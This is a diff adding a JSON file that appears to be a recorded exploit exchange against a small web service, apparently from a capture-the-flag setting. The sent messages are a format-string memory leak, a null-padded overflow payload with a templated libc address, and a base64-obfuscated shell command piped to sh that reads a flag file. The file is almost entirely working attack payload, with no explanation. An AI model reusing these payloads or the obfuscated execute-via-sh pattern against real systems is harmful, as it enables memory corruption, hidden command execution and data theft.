@@ -1,0 +1,8 @@
+[
+    "1Who r u?\\n", 
+    "0AAAAAAAA%5p:%6p:%7p:%8p\\n", 
+    "1welcome!AAAAAAAA0{{{HEAP_BASE:38776:3:ORI:62:0x663778}}}fed9b67390:0{{{HEAP_BASE:38776:3:ORI:62:0x663778}}}5ee3a76780:0{{{HEAP_BASE:38776:3:ORI:62:0x663778}}}5ee37a72c0:0{{{HEAP_BASE:38776:3:ORI:62:0x663778}}}5ee3c9d700", 
+    "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:987463:8:ORI:72:0x7f5ee37a1147}}}\\n", 
+    "1HTTP/1.1 404 Not Found\\r\\nContent-Type: text/html; charset=UTF-8\\r\\nContent-L{{{HEAP_BASE:118373:3:ORI:73:0x676e65}}}th: 23\\r\\nServer: EasyServer (Linux)\\r\\n\\r\\n<h3>{{{HEAP_BASE:115024:3:ORI:118:0x676150}}}e Not Found</h3>", 
+    "0echo \"Y2F0IC9mbGFncy9mYWtlLWNnaS9mbGFnIHxiYXNlNjQK\" |base64 -d |sh\\n"
+]
